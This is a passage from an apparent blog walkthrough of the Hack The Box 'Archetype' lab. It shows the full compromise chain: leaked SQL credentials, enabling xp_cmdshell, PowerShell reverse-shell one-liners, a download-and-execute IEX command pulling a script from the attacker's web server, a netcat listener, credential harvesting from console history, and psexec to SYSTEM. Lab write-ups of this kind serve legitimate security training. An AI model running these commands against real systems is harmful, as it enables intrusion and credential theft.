        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
    &lt;/Configuration&gt;
&lt;/DTSConfiguration&gt;</code></pre><hr><h2 id="02-lets-get-foothold-%E2%80%A6">02. Lets get Foothold &#x2026;</h2><p>Now we have credentials, &#xA0;Let&apos;s try connecting to the SQL Server using <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py" rel="noopener noreferrer">Impacket&apos;s </a>mssqlclient.py</p><blockquote>Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.source : <a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">https://github.com/SecureAuthCorp/impacket</a></blockquote><h3 id="021-download-and-use-mssqlclientpy">02.1 Download and use mssqlclient.py</h3><p>First we need to simply wget and download the mssqlclient.py script.</p><pre><code class="language-bash"> wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/mssqlclient.py
</code></pre><p>And then run the script and check whether we are working as a sysadmin (privileged user) or not.</p><pre><code class="language-bash">python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth</code></pre><p>Now we can use the <a href="https://docs.microsoft.com/en-us/sql/t-sql/functions/is-srvrolemember-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><strong>IS_SRVROLEMEMBER </strong></a>function to check whether the current SQL user has sysadmin (highest level) privileges on the SQL Server.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
&#x26A1;&#x276F; python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to &apos;master&apos;.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL&gt; SELECT IS_SRVROLEMEMBER (&apos;sysadmin&apos;)


-----------

          1

SQL&gt;</code></pre><p>According to the return value (1 = login is a member of role.) yes we have highest privileges.&#x1F601; This will allow us to enable <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15" rel="noopener noreferrer"><code>xp_cmdshell</code></a> and gain RCE on the host.</p><p>Check below awesome blog posts to understand that trick.</p><ul><li>Pentesting MSSQL - Microsoft SQL Server <a href="https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server" rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server</a></li><li>MySQL Information Gathering <a href="https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql" rel="noopener noreferrer">https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql</a></li></ul><h3 id="022-usage-of-xpcmdshell">02.2 Usage of &#xA0;xp_cmdshell</h3><p>To get <code>xp_cmdshell</code>, type below commands.</p><pre><code class="language-sql">EXEC sp_configure &apos;Show Advanced Options&apos;, 1; 
reconfigure; 
sp_configure; 
EXEC sp_configure &apos;xp_cmdshell&apos;, 1 
reconfigure; 
xp_cmdshell &quot;whoami&quot;</code></pre><pre><code class="language-sql">SQL&gt; xp_cmdshell &quot;whoami&quot;
output

--------------------------------------------------------------------------------

archetype\sql_svc

NULL</code></pre><p>However, Now we can run system commands using `xp_cmdshell`. why can&apos;t we get proper shell. &#x1F920;</p><p>Hmmmmah !! what a nice smell for powershell reverse-shell huh! &#x1F60D;</p><p>You can get some idea about reverse shells from below links,</p><ul><li>Reverse Shell Generator <a href="https://www.revshells.com/" rel="noopener noreferrer">https://www.revshells.com</a>&#x200B;</li><li>Nishang framework <a href="https://github.com/samratashok/nishang" rel="noopener noreferrer">https://github.com/samratashok/nishang</a>&#x200B;</li><li>TCP port communications with PowerShell <a href="https://livebook.manning.com/book/powershell-deep-dives/chapter-4/" rel="noopener noreferrer">https://livebook.manning.com/book/powershell-deep-dives/chapter-4</a>&#x200B;</li></ul><p>But personally, I like to use Nishang&apos;s <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1" rel="noopener noreferrer">Invoke-PowerShellTcpOneLine.ps1</a> to create my rev-shell.</p><p>After deleting all comments and unwanted things, powershell script will be like this. &#x1F447;</p><pre><code class="language-bash">$client = New-Object System.Net.Sockets.TCPClient(&apos;YourIP&apos;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$sm=(New-Object Net.Sockets.TCPClient(&apos;YourIP&apos;,4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)}</code></pre><blockquote>Remember: Type <strong><strong><code>ifconfig tun0</code> </strong></strong>and replace<strong><strong> YourIP</strong></strong></blockquote><h3 id="023-get-reverse-shell">02.3 Get Reverse Shell</h3><p>Now time to get reverse shell. Save above powershell script as anyname.ps1 (here I use script.ps1) and power up mini webserver. I&apos;m a very lasy man you know &#x1F644; so here I use <a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer"><code>updog</code> </a>instead of typing long shit in python &#x1F611;</p><blockquote>Updog is a replacement for Python&apos;s <code>SimpleHTTPServer</code>. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use HTTP basic auth.source : <a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer">https://github.com/sc0tfree/updog</a>&#x200B;root in</blockquote><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
&#x26A1;&#x276F; updog
[+] Serving /root/Documents/HackThebox/Archetype...
 * Running on http://0.0.0.0:9090/ (Press CTRL+C to quit)</code></pre><p>To listen the connection, I always use the swiss army knife (`<strong><strong>netcat</strong>`<strong>) </strong></strong>tool. personally I do not like to get shell through multi handler (`metasploit`). Trust me, using netcat tool you can learn a lot of things beyond metaspolit. &#x1F47D;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
&#x26A1;&#x276F; nc -lvnp 4444
 listening on [any] 4444 ... </code></pre><hr><h2 id="03-exploit-the-target-%E2%80%A6">03. Exploit the target &#x2026;</h2><p>Now we can issue the command to download and execute the reverse shell through <code>xp_cmdshell</code>.</p><pre><code class="language-bash">EXEC xp_cmdshell &apos;echo IEX (New-Object Net.WebClient).DownloadString(&quot;http://10.10.16.39:9090/script.ps1&quot;) | powershell -noprofile&apos;
</code></pre><p>I divided up my terminal up to 3 parts using &#xA0;<a href="https://github.com/tmux/tmux/wiki" rel="noopener noreferrer">Tmux</a> multiplexer.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLHaXzk27LyhbgDjUf%2Fimage.png?alt=media&amp;token=0fa21382-731a-4469-911e-4a8d5ec43a1e" class="kg-image" alt="Archetype Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="outline: none; box-sizing: inherit; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; line-height: 1.625; max-width: 100%;">RevShell</span></figcaption></figure><p>Woooh!!! We got our shell. &#x1F480; A shell is received as <strong><strong><code>sql_svc</code></strong></strong>, and we can get the user.txt flag. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLIl1OHkcfDhlSqmNy%2Fimage.png?alt=media&amp;token=4160f34e-df3f-48ca-bc15-0e59feca779b" class="kg-image" alt="Archetype Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="outline: none; box-sizing: inherit; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; line-height: 1.625; max-width: 100%;">user.txt</span></figcaption></figure><hr><h2 id="04-privilege-escalation-%E2%80%A6">04. Privilege Escalation &#x2026;</h2><p>To escalate privileges we can run different tools. By the way, before run any tool there are some steps that you need to run to enumerate some information. I will be showing you one by one in each walkthroughs.</p><p>Did you remember? now we are in service account called <strong><strong><code>sql_svc</code>. </strong></strong>It&apos;s good practice to check recently accessed files/executed commands (<em>Keep in mind as good practice</em>). &#xA0;Mostly (default) our console history will be saved in <code>C:\Users\&lt;account_name&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> . Now you understand what our next step is.</p><p>Right, Let&apos;s check above file using type command. type</p><pre><code class="language-bash">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">PS C:\Users\Administrator&gt; type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
PS C:\Users\Administrator&gt;</code></pre><p>Oh no no no noooo.. You see?</p><p>The backup share is mapped with admin credentials. Remember if you saw something like this. ready to launch Impacket&apos;s <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py" rel="noopener noreferrer"><code>psexec.py</code></a> script.</p><pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
&#x26A1;&#x276F; python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file gZiCFMKg.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service FuWR on 10.10.10.27.....
[*] Starting service FuWR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system

C:\Windows\system32&gt;</code></pre><p>Finally we have Administrator Privileges. &#x1F44C; Now we can access the flag on the administrator desktop.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLP7ji_aKDAJVwtM3-%2Fimage.png?alt=media&amp;token=34f7112a-ba5b-4bd0-a2ae-c1d030b68a25" class="kg-image" alt="Archetype Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="outline: none; box-sizing: inherit; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; line-height: 1.625; max-width: 100%;">root.txt</span></figcaption></figure><figure class="kg-card kg-image-card"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-M_zEsWTNjRcuOaViQsC%2F-M_zFfzCHXa8Hugk-ADS%2Fimage.png?alt=media&amp;token=93d84b32-2d92-43ab-adf3-f9e1270cb647" class="kg-image" alt="Archetype Walkthrough" loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-5.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="292" height="172"></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item></channel></rss>